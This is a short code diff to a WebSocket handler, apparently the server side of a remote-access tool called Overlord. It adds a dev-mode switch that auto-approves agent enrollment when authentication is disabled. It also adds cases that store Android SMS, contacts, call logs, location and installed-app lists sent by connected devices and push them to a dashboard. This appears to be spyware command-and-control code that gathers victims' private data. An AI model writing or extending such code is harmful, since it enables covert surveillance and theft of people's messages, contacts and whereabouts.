@@ -387,6 +387,12 @@ export async function handleWebSocketMessage(
         }
 
         if (enrollmentStatus === "pending") {
+          // Dev mode: auto-approve when agent auth is disabled
+          if (process.env.OVERLORD_DISABLE_AGENT_AUTH === "true" && process.env.NODE_ENV !== "production") {
+            enrollmentStatus = "approved";
+          }
+        }
+        if (enrollmentStatus === "pending") {
           const geoip = await getGeoip();
           const geo = ip ? geoip.lookup(ip) : undefined;
           const countryRaw = geo?.country || (payload as any).country || "ZZ";
@@ -718,6 +724,16 @@ export async function handleWebSocketMessage(
           ws.data.disconnectDetail = detail || undefined;
           logger.debug(`[disconnect_info] ${client.id} reason=${reason}`);
         }
+        break;
+      }
+      case "android_device":
+      case "android_sms":
+      case "android_contacts":
+      case "android_calllog":
+      case "android_location":
+      case "android_apps": {
+        client.androidData = { ...(client.androidData || {}), [payloadType]: payload };
+        deps.notifyDashboard();
         break;
       }
       default:
